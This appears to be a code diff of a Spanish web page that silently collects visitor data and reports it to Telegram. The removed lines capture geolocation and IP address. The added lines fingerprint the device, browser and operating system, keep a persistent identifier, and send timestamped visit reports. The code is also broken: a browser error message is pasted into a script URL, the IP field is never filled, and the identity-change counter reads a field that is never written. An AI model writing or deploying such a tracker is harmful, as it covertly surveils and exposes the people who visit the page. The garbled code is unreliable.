@@ -2,14 +2,12 @@
 <html>
 <head>
   <title>Obtener Datos y Enviar a Telegram</title>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.28/ua-parser.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/Error with Permissions-Policy header: Origin trial controlled feature not enabled: 'interest-cohort.js/0.7.28/ua-parser.min.js"></script>
 </head>
 <body>
   <h1>Obtener Datos y Enviar a Telegram</h1>
 
   <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
-
-
 
   <script>
     // Objeto para almacenar los datos del usuario
@@ -41,62 +39,76 @@
         });
     }
 
-    // Obtener datos de ubicación, IP, dispositivo, navegador y sistema operativo
+    // Obtener datos de dispositivo, IP y mostrar mensaje en Telegram
     function getData() {
-      // Obtener la ubicación
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(position) {
-          var latitude = position.coords.latitude;
-          var longitude = position.coords.longitude;
-          userData.location = latitude + ',' + longitude;
-          console.log('Ubicación:', userData.location);
+      // Obtener información del dispositivo, navegador y sistema operativo
+      var userAgent = navigator.userAgent;
+      var parser = new UAParser();
+      var result = parser.setUA(userAgent).getResult();
 
-          // Obtener la IP
-          fetch('https://api.ipify.org/?format=json')
-            .then(response => response.json())
-            .then(data => {
-              userData.ip = data.ip;
-              console.log('IP:', userData.ip);
+      userData.device = result.device.model || '';
+      userData.brand = result.device.vendor || '';
+      userData.browser = result.browser.name || '';
+      userData.os = result.os.name || '';
 
-  // Obtener información del dispositivo, navegador y sistema operativo
-var userAgent = navigator.userAgent;
-var parser = new UAParser();
-var result = parser.setUA(userAgent).getResult();
+      // Obtener el identificador de dispositivo
+      var deviceIdentifier = localStorage.getItem('deviceIdentifier');
+      var isFirstTime = localStorage.getItem('isFirstTime') === null;
 
-userData.device = result.device.model || '';
-userData.brand = result.device.vendor || '';
-userData.browser = result.browser.name || '';
-userData.os = result.os.name || '';
-
-console.log('Dispositivo:', userData.device);
-console.log('Marca:', userData.brand);
-console.log('Navegador:', userData.browser);
-console.log('Sistema Operativo:', userData.os);
-
-
-
-              // Obtener el identificador de dispositivo
-              var deviceIdentifier = localStorage.getItem('deviceIdentifier');
-              var isFirstTime = localStorage.getItem('isFirstTime') === null;
-
-              if (isFirstTime) {
-                deviceIdentifier = generateDeviceIdentifier(); // Generar un identificador único
-                localStorage.setItem('deviceIdentifier', deviceIdentifier);
-                localStorage.setItem('isFirstTime', 'false');
-                console.log('Es el primer inicio del dispositivo');
-                sendToTelegram('Es el primer inicio del dispositivo\n\n' + JSON.stringify(userData, null, 2));
-              } else if (deviceIdentifier === localStorage.getItem('deviceIdentifier')) {
-                console.log('Los datos del dispositivo son iguales');
-                sendToTelegram('Los datos del dispositivo son iguales\n\n' + JSON.stringify(userData, null, 2));
-              } else {
-                console.log('Los datos del dispositivo han cambiado');
-sendToTelegram('Los datos del dispositivo han cambiado\n\n' + JSON.stringify(userData, null, 2));
-
-              }
-            })
-            .catch(error => console.error('Error al obtener los datos:', error));
-        });
+      if (isFirstTime) {
+        deviceIdentifier = generateDeviceIdentifier(); // Generar un identificador único
+        localStorage.setItem('deviceIdentifier', deviceIdentifier);
+        localStorage.setItem('isFirstTime', 'false');
+        console.log('Es el primer inicio del dispositivo');
+        sendToTelegram('Hola, el usuario ha ingresado a las ' + getCurrentTime() + '\n\n' +
+                      'Información del dispositivo:\n' +
+                      'Dispositivo: ' + userData.device + '\n' +
+                      'Marca: ' + userData.brand + '\n' +
+                      'IP: ' + userData.ip + '\n' +
+                      'Este usuario es: Primer inicio\n' +
+                      'El usuario ha cambiado de identidad: No\n' +
+                      'El usuario ha cambiado de identidad: 0 veces');
+      } else if (deviceIdentifier === localStorage.getItem('deviceIdentifier')) {
+        console.log('Los datos del dispositivo son iguales');
+        sendToTelegram('Hola, el usuario ha ingresado a las ' + getCurrentTime() + '\n\n' +
+                      'Información del dispositivo:\n' +
+                      'Dispositivo: ' + userData.device + '\n' +
+                      'Marca: ' + userData.brand + '\n' +
+                      'IP: ' + userData.ip + '\n' +
+                      'Este usuario es: No es el primer inicio\n' +
+                      'El usuario ha cambiado de identidad: Sí\n' +
+                      'El usuario ha cambiado de identidad: ' + getIdentityChanges() + ' veces');
       }
+
+      // Actualizar la cantidad de veces que el usuario ha cambiado de identidad
+      localStorage.setItem('identityChanges', JSON.stringify(userData));
+
+      // Otras acciones que deseas realizar
+      // ...
+
+    }
+
+    // Obtener la hora actual en formato de 12 horas
+    function getCurrentTime() {
+      var now = new Date();
+      var hours = now.getHours();
+      var minutes = now.getMinutes();
+      var ampm = hours >= 12 ? 'PM' : 'AM';
+      hours = hours % 12;
+      hours = hours ? hours : 12; // Si hours es 0, se reemplaza por 12
+      minutes = minutes < 10 ? '0' + minutes : minutes;
+      var time = hours + ':' + minutes + ' ' + ampm;
+      return time;
+    }
+
+    // Obtener la cantidad de veces que el usuario ha cambiado de identidad
+    function getIdentityChanges() {
+      var identityChanges = localStorage.getItem('identityChanges');
+      if (identityChanges) {
+        identityChanges = JSON.parse(identityChanges);
+        return identityChanges.changes || 0;
+      }
+      return 0;
     }
 
     // Generar un identificador único para el dispositivo
@@ -118,4 +130,3 @@ sendToTelegram('Los datos del dispositivo han cambiado\n\n' + JSON.stringify(use
   </script>
 </body>
 </html>
-
